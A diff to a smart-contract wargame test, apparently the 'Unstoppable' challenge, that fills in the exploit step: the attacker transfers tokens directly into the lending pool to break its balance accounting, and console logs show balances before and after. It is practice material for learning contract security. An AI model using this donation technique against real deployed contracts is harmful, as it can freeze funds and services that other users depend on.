@@ -39,7 +39,16 @@ describe('[Challenge] Unstoppable', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        const attackerTokens = await this.token.balanceOf(attacker.address);
+        console.log("attacker tokens before",attackerTokens.toString())
+        console.log("victim tokens before attack",await this.token.balanceOf(this.pool.address).then(res=>res.toString()))
+        await this.token.connect(attacker).transfer(this.pool.address, 100);
+        // await this.token.transferFrom(attacker.address,this.pool.address,10);
+
+        const attackerTokensAfter = await this.token.balanceOf(attacker.address);
+        console.log("attacker tokens after",attackerTokensAfter.toString())
+        console.log("victim tokens after attack",await this.token.balanceOf(this.pool.address).then(res=>res.toString()))
+
     });
 
     after(async function () {
